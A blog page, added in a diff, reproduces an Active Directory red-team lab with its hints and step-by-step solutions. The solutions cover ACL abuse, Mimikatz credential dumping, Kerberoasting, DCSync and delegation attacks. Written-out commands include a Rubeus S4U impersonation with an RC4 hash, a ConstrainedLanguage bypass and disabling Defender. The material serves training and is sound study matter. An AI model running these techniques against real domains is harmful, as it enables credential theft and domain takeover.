@@ -1,0 +1,710 @@
+
+
+  <!DOCTYPE html>
+  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
+  <style>
+    .text1
+    {
+    text-shadow: 0px 0px 2px #f2f3f2;
+    }
+    </style>
+
+  
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" type="image/png" href="/null">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>攻击链四：域渗透案例一 - whale3070&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body>
+      <header style="height: 70vh;">
+        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+          <div class="banner" id="banner" false
+            style="background: url('/img/default.png') no-repeat center center;
+              background-size: cover;">
+              <div class="full-bg-img">
+                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+                  <div class="page-header text-center fade-in-up">
+                    <span class="h2 text1" id="subtitle" title="攻击链四：域渗透案例一">
+                      
+                        攻击链四：域渗透案例一
+                      
+                    </span>
+        
+                    
+                      <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-22 11:12" pubdate>
+        June 22, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      85
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+                    
+                  </div>
+                    
+                  </div>
+                  
+                </div>
+              </div>
+          </div>
+      </header>
+
+      <main>
+        
+          
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻击链四：域渗透案例一</h1>
+            
+            <div class="markdown-body">
+              <h3 id="Scenario-smallcaps"><a href="#Scenario-smallcaps" class="headerlink" title="Scenario{.smallcaps}"></a>Scenario{.smallcaps}</h3><p>In the following lab (created by our senior instructor Slavi Parpulev), you can practice some of the attacks against Active Directory infrastructure that were explained in the <em>Penetration Testing eXtreme</em> course.</p>
+<p>You are engaged in a red teaming engagement. Your goal is to find ways to stealthily escalate to Domain Administrator (or similar privileges). The environment has been configured with certain restrictions and additional hardening has been applied. <strong>Bear in mind that an Antivirus solution is enforced in the environment, therefore either ensure that your payloads are undetected before attempting to execute them in the customer’s environment or disable it altogether.</strong></p>
+<p><strong>The Scope of Engagement contains the following subnets:</strong></p>
+<ul>
+<li><p>  <strong>175.12.80.1/24 (Pentester VLAN)</strong></p>
+</li>
+<li><p>  <strong>172.16.80.1/24 (Accessible/exposed IP Range)</strong></p>
+</li>
+<li><p>  <strong>10.100.11.1/24 (Internal IP Range)</strong></p>
+</li>
+<li><p>  <strong>10.100.10.0/24 (Critical Infrastructure IP Range)</strong></p>
+</li>
+</ul>
+<p>For this lab, you begin in the Pentester VLAN, however, your customer has provided you with Remote Desktop access (<strong>RDP</strong>) to one of their machines (workstation01 - <strong>172.16.80.100</strong>) to perform an assume-breach assessment. The provided machine is a standard build for their environment, and the credentials provided to you are:</p>
+<p><strong>Username</strong>: els\analyst1</p>
+<p><strong>Password</strong>: P@ssw0rd123</p>
+<p><strong>NOTE:</strong> After each scenario, we recommend that the environment is reset back to its original state (Stop button, then Reset button).</p>
+<h3 id="Goals-smallcaps"><a href="#Goals-smallcaps" class="headerlink" title="Goals{.smallcaps}"></a>Goals{.smallcaps}</h3><p>Stealthily escalate your privileges to Domain Administrator-level ones in the five (5) distinct scenarios below, from a non-privileged domain user.</p>
+<p>Overall, learn, understand and exploit:</p>
+<ul>
+<li><p>  Unconstrained delegation in Active Directory</p>
+</li>
+<li><p>  Constrained delegation in Active Directory</p>
+</li>
+<li><p>  Resource-Based delegation in Active Directory</p>
+</li>
+<li><p>  Common pitfalls and misconfigurations often left behind by system administrators</p>
+</li>
+<li><p>  Active Directory objects’ Access Control Lists</p>
+</li>
+<li><p>  Escalation attacks through credentials dumping and DCSync</p>
+</li>
+<li><p>  Shadow Principals in Active Directory</p>
+</li>
+</ul>
+<h3 id="What-you-will-learn-smallcaps"><a href="#What-you-will-learn-smallcaps" class="headerlink" title="What you will learn{.smallcaps}"></a>What you will learn{.smallcaps}</h3><p>During the lab, you will learn how to enumerate Active Directory to discover misconfigurations and also abuse AD features often found in real-world implementations. You will also learn how to travers different network subnets and exploit systems and services which may not be directly routable by your machine.</p>
+<p>To guide you during the lab you will find different Tasks (referred to as Scenarios).</p>
+<p>These tasks (scenarios) were set up for educational purposes and to show you the usage of different tools and different methods to achieve the same goal.</p>
+<p>If this is the first time you do this lab, we advise you to follow these Tasks.</p>
+<p>Once you have completed all the Tasks, you can proceed to the end of this manual and check the solutions</p>
+<h3 id="Recommended-tools-smallcaps"><a href="#Recommended-tools-smallcaps" class="headerlink" title="Recommended tools{.smallcaps}"></a>Recommended tools{.smallcaps}</h3><ul>
+<li><p>  <a target="_blank" rel="noopener" href="https://www.visualstudio.com/vs/older-downloads/">Visual Studio</a></p>
+</li>
+<li><p>  <a target="_blank" rel="noopener" href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">[ProcDump]</a> &amp; mimikatz (for dumping lsass process to a file and extracting credentials/hashes offline)</p>
+</li>
+<li><p>  <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound3">SharpHound</a></p>
+</li>
+<li><p>  Various tools from <a target="_blank" rel="noopener" href="https://github.com/GhostPack">GhostPack</a></p>
+</li>
+<li><p>  RDP</p>
+</li>
+<li><p>  <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a></p>
+</li>
+<li><p>  <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a></p>
+</li>
+</ul>
+<h2 id="Tasks-smallcaps"><a href="#Tasks-smallcaps" class="headerlink" title="Tasks{.smallcaps}"></a>Tasks{.smallcaps}</h2><h3 id="Task-1-Scenario-1-ACL-abuse-smallcaps"><a href="#Task-1-Scenario-1-ACL-abuse-smallcaps" class="headerlink" title="Task 1: Scenario 1 - ACL abuse{.smallcaps}"></a>Task 1: Scenario 1 - ACL abuse{.smallcaps}</h3><p>Identify an ACL-based escalation path to Domain administrator starting as analyst1.</p>
+<h3 id="Task-2-Scenario-2-Constrained-Delegation-smallcaps"><a href="#Task-2-Scenario-2-Constrained-Delegation-smallcaps" class="headerlink" title="Task 2: Scenario 2 - Constrained Delegation{.smallcaps}"></a>Task 2: Scenario 2 - Constrained Delegation{.smallcaps}</h3><p>Perform AD reconnaissance and identify a way to utilize constrained delegation to escalate your privileges to Domain administrator, starting as analyst1.</p>
+<h3 id="Hints"><a href="#Hints" class="headerlink" title="Hints:"></a>Hints:</h3><ul>
+<li><p>  Passwords in files? It happens …</p>
+</li>
+<li><p>  If you cannot impersonate a Domain administrator, what else is there?</p>
+</li>
+<li><p>  Not all Secure strings are … so secure.</p>
+</li>
+</ul>
+<h3 id="Task-3-Scenario-3-Resource-Based-Delegation-smallcaps"><a href="#Task-3-Scenario-3-Resource-Based-Delegation-smallcaps" class="headerlink" title="Task 3: Scenario 3 - Resource-Based Delegation{.smallcaps}"></a>Task 3: Scenario 3 - Resource-Based Delegation{.smallcaps}</h3><p>Perform AD reconnaissance and identify a way to utilize resource-based delegation to escalate your privileges to Domain administrator, starting as analyst1.</p>
+<h3 id="Hints-1"><a href="#Hints-1" class="headerlink" title="Hints:"></a>Hints:</h3><ul>
+<li><p>  Passwords in attributes? It happens …</p>
+</li>
+<li><p>  Object’s owner has implicit full control of the object</p>
+</li>
+<li><p>  ACL Path from scenario one can be useful here</p>
+</li>
+</ul>
+<h3 id="Task-4-Scenario-4-Unconstrained-delegation-smallcaps"><a href="#Task-4-Scenario-4-Unconstrained-delegation-smallcaps" class="headerlink" title="Task 4: Scenario 4 - Unconstrained delegation{.smallcaps}"></a>Task 4: Scenario 4 - Unconstrained delegation{.smallcaps}</h3><p>Perform AD reconnaissance and identify a way to abuse Unconstrained delegation to escalate to Domain administrator, starting as analyst1.</p>
+<h3 id="Hints-2"><a href="#Hints-2" class="headerlink" title="Hints:"></a>Hints:</h3><ul>
+<li><p>  Kerberos pre-authentication</p>
+</li>
+<li><p>  LAPS</p>
+</li>
+<li><p>  Printer bug</p>
+</li>
+</ul>
+<h3 id="Task-5-Scenario-5-Shadow-Principals-smallcaps"><a href="#Task-5-Scenario-5-Shadow-Principals-smallcaps" class="headerlink" title="Task 5: Scenario 5 - Shadow Principals{.smallcaps}"></a>Task 5: Scenario 5 - Shadow Principals{.smallcaps}</h3><p>Perform AD reconnaissance and identify a way to abuse Shadow Principals from another forest to gain access to “els.bank”, starting as analyst1.</p>
+<h3 id="Hints-3"><a href="#Hints-3" class="headerlink" title="Hints:"></a>Hints:</h3><ul>
+<li><p>  Server Side Include (IIS)</p>
+</li>
+<li><p>  Parameter Serialization</p>
+</li>
+</ul>
+<h2 id="SOLUTIONS-smallcaps"><a href="#SOLUTIONS-smallcaps" class="headerlink" title="SOLUTIONS{.smallcaps}"></a>SOLUTIONS{.smallcaps}</h2><p>Below, you can find solutions for each task. Remember though that you can follow your own strategy (which may be different from the one explained in the following lab).</p>
+<h3 id="Task-1-Scenario-1-ACL-Abuse-smallcaps"><a href="#Task-1-Scenario-1-ACL-Abuse-smallcaps" class="headerlink" title="Task 1: Scenario 1 - ACL Abuse{.smallcaps}"></a>Task 1: Scenario 1 - ACL Abuse{.smallcaps}</h3><p>Using basic enumeration we see that, except us, there is another user who is logged onto the machine:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image7.png" srcset="/img/loading.gif"></p>
+<p>Let’s note that for now and continue with the enumeration process. Proceed by using SharpUp (from GhostPack) to enumerate the machine for common escalation misconfigurations:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image8.png" srcset="/img/loading.gif"></p>
+<p>We can immediately spot that there is a service, which we can modify. There are many different directions to go from here. That being said, we’ll simply create our own service binary that adds “Analyst1” to the local administrators’ group. The code used inside it is the following.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image9.png" srcset="/img/loading.gif"></p>
+<p>Building the above, moving the binary to “workstation01” and starting the service gives us the following.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image10.png" srcset="/img/loading.gif"></p>
+<p>We successfully added our user to the local administrators’ group. For additional reconnaissance, we executed SharpHound to attempt and identify ways to Domain Administrator. A simple search in it displaying paths to Domain administrator shows the following.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image11.png" srcset="/img/loading.gif"></p>
+<p>There is a path from user “Johnny”. We also identified earlier that “Johnny” is logged on to “workstation01”. Let’s get back to this in a second.</p>
+<p>The natural next step is to identify any hardening that is applied on the machine, the most obvious way to do this is by inspecting applied GPOs. To produce such output, we need to run the command “<em>gpresult -h gpos.html</em>“ in an elevated prompt.</p>
+<p>An important observation from the output at this point, is that the local administrators group of workstation01 is managed by a GPO, which deletes all members except the pre-set ones. This means that even though we managed to escalate, our user will be removed from the group next time the policies update (within the next 90 minutes by default).</p>
+<p>Disable the Antivirus (Windows Defender) to ensure that our activities don’t trigger any alerts on detected suspicious/malicious activity on the machine.</p>
+<p>Now, let’s go back to “Johhny”. Since the user is logged on to the machine, we can perform a credential dumping attack to extract his password either in plaintext or at least the password hashes (depending on the settings applied to the machine!). Our preferred method is to perform a mini dump and then use Mimikatz to parse the memory dump. By doing so, we get the following:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image12.png" srcset="/img/loading.gif"></p>
+<p>We can then use the password hash to obtain a Kerberos ticket as “Johnny” using Rubeus:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image13.png" srcset="/img/loading.gif"></p>
+<p>Now that we are impersonating “Johnny”, we can follow the attack path discovered by BloodHound. The next step is a “GenericWrite” permission that “Johnny” has to the user “Exch_adm”. With these rights, we can register a SPN for the user “Exch_adm”, which will give us the possibility to perform a targeted Kerberoasting attack against that user and crack their password offline afterwards with Hashcat. To register an SPN, we execute the following command (ensure that you are running the shell executing <em>setspn</em> as user Johnny!]:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image14.png" srcset="/img/loading.gif"></p>
+<p>We then run the Kerberoast attack for the user “exch_adm”:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image15.png" srcset="/img/loading.gif"></p>
+<p>Finally, we provide the obtained hashes to Hashcat to crack them offline and obtain the plain text password of “exch_adm”:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image16.png" srcset="/img/loading.gif"></p>
+<p>We successfully recovered the password of “exch_adm”, which is “Qwerty1”.</p>
+<p>Following the path from BloodHound, “exch_adm” due to his membership of “SG_AzureSync” has “WriteDACL” permissions on the domain object “els.bank”. This in fact, gives “exch_adm” the permissions to assign any privileges to that object to any user. Using Rubeus (similarly to earlier), we can obtain a ticket for “exch_adm” and assign him the permissions “Replicate Directory Changes” and “Replicate Directory Changes All”, which are necessary to perform DCSync. Assuming we just executed Rubeus, we should be able to see a similar output:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image17.png" srcset="/img/loading.gif"></p>
+<p>Assigning the rights can be achieved with PowerView (although workstation01 is set to run PowerShell in ConstrainedLanguage, you can bypass it in this case by executing “setx __PSLockdownPolicy 0 /m” from an elevated prompt):</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image18.png" srcset="/img/loading.gif"></p>
+<p>With the DCSync permissions assigned, we can extract the password hashes of any/all Domain users by using Mimikatz. In the following picture, we extract the password hash of the “Administrator” account of the domain:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image19.png" srcset="/img/loading.gif"></p>
+<p>We can use the hash value with Rubeus to authenticate as the Administrator and access Bank-DC:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image20.png" srcset="/img/loading.gif"></p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image21.png" srcset="/img/loading.gif"></p>
+<h3 id="Task-2-Scenario-2-Constrained-Delegation-smallcaps-1"><a href="#Task-2-Scenario-2-Constrained-Delegation-smallcaps-1" class="headerlink" title="Task 2: Scenario 2 - Constrained Delegation{.smallcaps}"></a>Task 2: Scenario 2 - Constrained Delegation{.smallcaps}</h3><p>A common escalation technique in Active Directory environments is through identifying plaintext credentials in script files that are placed on network shares. The obvious location is the SYSVOL folder of the domain, although other servers’ shares are also important (SCCM, IT Folders etc. which often have weak permissions and every domain user can access them). In this scenario, we’ll scan SYSVOL for stored passwords in file types such as .bat, .cmd, .cmdline, .ps1, .config, .conf, .properties and .vbs. Many tools have this functionality, including built-in ones such as “findstr”. Scanning through the share, we locate a single batch file which contains the following:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image22.png" srcset="/img/loading.gif"></p>
+<p>Let’s query Active Directory for information about the user whose password we just found:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image23.png" srcset="/img/loading.gif"></p>
+<p>It seems that the user is TRUSTED_TO_AUTH_FOR_DELEGATION (useraccesscontrol property) to the server Dev01.els.bank (msds-allowedtodelegateto property). This is configured for constrained delegation, and can be abused with Rubeus, where we can impersonate any user of our choosing to login to that server with (except those in the group “Protected Users” or accounts with the “This account is sensitive and cannot be delegated” right). Unfortunately for us, all Domain administrators are members of the “Protected Users” group, so we can’t directly impersonate them. Let’s look for users who may be local administrators on that server instead. Based on the naming conventions of AD groups that may have that privilege, we see the group “DEV01_ADMINS”, whose member is “Developer1”:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image24.png" srcset="/img/loading.gif"></p>
+<p>Let’s impersonate that user, and use also protocol transition from the initial ‘HOST’ service, to ‘HTTP’, which will give us the rights to perform PSRemoting to that server and hence remote code execution (the first command is executed because we need to provide a hash value to Rubeus):</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image25.png" srcset="/img/loading.gif"></p>
+<p>To ensure that everything went as planned, let’s check if we have a ticket for “Developer1”:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image26.png" srcset="/img/loading.gif"></p>
+<p>This is great! The ticket is active and the service is HTTP as specified in the “/altservice” parameter. We can now utilize PSRemoting to connect to the host:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image27.png" srcset="/img/loading.gif"></p>
+<p>Now that we have administrative access to Dev01, we can perform enumeration of that server locally. Even though we have administrative rights, there is a folder “C:\app”, whose content we cannot read. To view its permissions, we can utilize “Get-Acl”:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image28.png" srcset="/img/loading.gif"></p>
+<p>A local account ‘Tester’, a domain account ‘slavi-adm’ and members of the group ‘Developers’ are allowed access. Our best bet at this point is the local account “Tester”, since we have administrative rights to the server. We can extract the password hashes of that account from the registry hive on the machine, or since we have administrative rights we can also force-change its password. We will change the password and also add the account to the local administrators group, as follows:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image29.png" srcset="/img/loading.gif"></p>
+<p>Now we can login to the server with that account and head to C:\app to identify what is stored in that folder. It appears that it contains these files:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image30.png" srcset="/img/loading.gif"></p>
+<p>If we look through the files, connect.properties appears to contain a user name and a PowerShell SecureString object as encrypted password in that file:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image31.png" srcset="/img/loading.gif"></p>
+<p>The file key.txt appears to contain the key used for the encryption in the PowerShell SecureString function. Using it, we can decrypt the value:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image32.png" srcset="/img/loading.gif"></p>
+<p>According to the data in BloodHound, the user “ronni” has “GenericAll” over “Domain Admins” (because this user is added to the AdminSDHolder property). We can use “ronni” to add any user (e.g. analyst1) to the group “Domain admins”:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image33.png" srcset="/img/loading.gif"></p>
+<p><strong>NOTE</strong>: this command prompt was spawned on workstation01 through “runas”, instead of Dev01 because “ronni” does not have privileges to perform that action on the server.</p>
+<p>We achieved a successful escalation to Domain administrator.</p>
+<h3 id="Task-3-Scenario-3-Resource-Based-Delegation-smallcaps-1"><a href="#Task-3-Scenario-3-Resource-Based-Delegation-smallcaps-1" class="headerlink" title="Task 3: Scenario 3 - Resource-Based Delegation{.smallcaps}"></a>Task 3: Scenario 3 - Resource-Based Delegation{.smallcaps}</h3><p>In this scenario (just as in Scenario 2), we’ll scan only SYSVOL for stored passwords in file types such as .bat, .cmd, .cmdline, .ps1, .config, .conf, .properties and .vbs. Scanning through the share, we’ll locate a single batch file which contains the following:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image22.png" srcset="/img/loading.gif"></p>
+<p>Let’s query information about the user whose password we found:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image34.png" srcset="/img/loading.gif"></p>
+<p>We’ll take a note for this user and the associated properties that we have discovered, specifically note that the user has an SPN registered.</p>
+<p>Next, we’ll scan for passwords in AD attributes of the user objects. We are interested in the presence of the word “pass” or “pw”. Through a quick search, we identify that the user “slavi” has a match on the description attribute as follows:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image35.png" srcset="/img/loading.gif"></p>
+<p>Looking into the permissions of that account in Bloodhound, we discover that indirectly, the account has “WriteOwner” permissions on the Domain Controller AD object:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image36.png" srcset="/img/loading.gif"></p>
+<p>This gives user “slavi” the ability to change owner of that object. We can use the user to assign him as the owner of the object, which will give us access to modifying all other attributes of that object (being owner gives implicit GenericAll of the object). One of the interesting attributes that we can modify is “msds-allowedtoactonbehalfofotheridentity”, which will enable us to perform a Resource-Based delegation attack when combined with the user svc-omada whose password we found in a share earlier (because this account has an SPN, which is a prerequisite for this type of attack).</p>
+<p>Let’s start by changing the owner of the object. It can be done as follows with PowerView</p>
+<p><strong>(PowerShell prompt running as user ELS\slavi):</strong></p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image37.png" srcset="/img/loading.gif"></p>
+<p>Now that the owner is changed, we can assign ourselves GenericAll permissions:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image38.png" srcset="/img/loading.gif"></p>
+<p>Finally, the following commands will configure the necessary steps for assigning the necessary values to certain attributes that will enable us to perform the delegation abuse attack:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image39.png" srcset="/img/loading.gif"></p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image40.png" srcset="/img/loading.gif"></p>
+<p>With everything set now, we can utilize Rubeus to get a ticket for “exch_adm” and assign the DCSync rights as we did in Scenario 1 (remember that Domain admins are members of “Protected users” so we can’t simply utilize this attack to get access to those accounts).</p>
+<p><strong>(PowerShell prompt running as user ELS\analyst1)</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">.\Rubeus.exe s4u <span class="hljs-string">/user</span><span class="hljs-function">:svc-omada</span> <span class="hljs-string">/rc4</span><span class="hljs-function">:65F91B600E51F19A80593D0A62047CC5</span> <span class="hljs-string">/impersonateuser</span>:<span class="hljs-string">&quot;exch_adm&quot;</span> <span class="hljs-string">/msdsspn</span>:<span class="hljs-string">&quot;host/bank-dc.els.bank&quot;</span> <span class="hljs-string">/altservice</span><span class="hljs-function">:ldap</span>,rpc,http,cifs <span class="hljs-string">/ptt</span><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image42.png" srcset="/img/loading.gif"></p>
+<p>_<em>_Please also execute the above Rubeus and PowerView commands inside the previous PowerShell prompt that is running as user ELS\slavi. Even though this is not required for the attack to be successful, it may resolve an AD quirk.</em>*</p>
+<p>Back to the PowerShell prompt as user ELS\analyst1, with DCSync rights assigned, we can utilize Mimikatz and extract the password of the Administrator for the domain:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image43.png" srcset="/img/loading.gif"></p>
+<h3 id="Task-4-Scenario-4-Unconstrained-delegation-smallcaps-1"><a href="#Task-4-Scenario-4-Unconstrained-delegation-smallcaps-1" class="headerlink" title="Task 4: Scenario 4 - Unconstrained delegation{.smallcaps}"></a>Task 4: Scenario 4 - Unconstrained delegation{.smallcaps}</h3><p>During the reconnaissance phase, we identified that the user Lisa does not require Kerberos pre-authentication, therefore, we can perform Asreproast and offline crack the password. For the extraction, we’ll use Rubeus as follows:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image44.png" srcset="/img/loading.gif"></p>
+<p>With the extracted data, we run hashcat to recover the plain text password:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image45.png" srcset="/img/loading.gif"></p>
+<p>Now that we have recovered Lisa’s password, we can use Bloodhound to identify the access she has in the domain:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image46.png" srcset="/img/loading.gif"></p>
+<p>It appears that Lisa has “GenericAll” permissions over the UAT Organizational Unit. Querying the location, we can see that there is a single server object placed there UAT01. With “GenericAll” on the OU, we can modify that permission itself, to also apply on descending objects in the OU, which means we’ll set ourselves those rights on the computer object placed in the OU. The following is the execution of commands through PowerShell and the Microsoft AD module (DLL available at <a target="_blank" rel="noopener" href="https://github.com/samratashok/ADModule">https://github.com/samratashok/ADModule</a>) to achieve that ACL modification (Note this requires that PowerShell is not in ConstrainedLanguage, so if you go in this path, you should ensure that you have escalated your privileges to bypass the ConstrainedLanguage restriction):</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image75.png" srcset="/img/loading.gif"></p>
